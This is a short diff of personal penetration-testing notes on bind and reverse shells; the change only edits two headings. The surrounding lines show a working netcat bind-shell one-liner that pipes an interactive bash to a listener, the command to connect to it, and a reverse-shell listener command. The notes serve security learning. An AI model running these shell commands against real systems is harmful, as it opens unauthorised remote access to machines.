@@ -1,5 +1,5 @@
 https://www.revshells.com/
-# Bind Shell
+# #Bind Shell
 ![[Pasted image 20230731115803.png]]
 Target system has a listener and awaits a connection from the attacker.
 ### Bind Shell with NC 
@@ -10,7 +10,7 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 1234 > /tmp/
 nc -nv <ip> <port>
 ```
 
-# Reverse Shell
+# #Reverse Shell
 Attacker 
 ```shell
 sudo nc -lvnp 443
